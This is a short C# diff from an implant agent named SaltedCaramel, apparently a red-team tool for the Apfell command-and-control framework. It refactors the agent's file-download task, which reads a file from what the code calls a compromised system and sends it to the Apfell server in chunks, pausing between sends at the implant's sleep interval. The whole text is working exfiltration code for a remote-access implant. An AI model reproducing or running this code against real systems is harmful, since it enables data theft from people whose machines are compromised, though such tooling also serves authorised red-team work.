@@ -3,6 +3,7 @@ using System;
 using System.Diagnostics;
 using System.IO;
 using System.Threading;
+using Apfell.Structs;
 
 /// <summary>
 /// This task will download a file from a compromised system to the Apfell server
@@ -31,7 +32,7 @@ namespace SaltedCaramel.Tasks
                 // Send number of chunks associated with task to Apfell server
                 // Response will have the file ID to send file with
                 SCTaskResp initial = new SCTaskResp(task.id, "{\"total_chunks\": " + total_chunks + ", \"task\": \"" + task.id + "\"}");
-                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.PostResponse(initial));
+                DownloadReply reply = JsonConvert.DeserializeObject<DownloadReply>(implant.Profile.PostResponse(initial));
                 Debug.WriteLine($"[-] Download - Received reply, file ID: " + reply.file_id);
 
 
@@ -71,13 +72,13 @@ namespace SaltedCaramel.Tasks
                     // Send our FileChunk to Apfell server
                     SCTaskResp response = new SCTaskResp(task.id, JsonConvert.SerializeObject(fc));
                     Debug.WriteLine($"[+] Download - CHUNK SENT: {fc.chunk_num}");
-                    Debug.WriteLine($"[-] Download - RESPONSE: {implant.PostResponse(response)}");
+                    Debug.WriteLine($"[-] Download - RESPONSE: {implant.Profile.PostResponse(response)}");
                     // Make sure we respect the sleep setting
-                    Thread.Sleep(implant.sleep);
+                    Thread.Sleep(implant.SleepInterval);
                 }
 
                 // Tell the Apfell server file transfer is done
-                implant.SendComplete(task.id);
+                implant.Profile.SendComplete(task.id);
                 Debug.WriteLine($"[+] Download - File transfer complete: {filepath}");
             }
             catch (Exception e) // Catch any exception from file upload
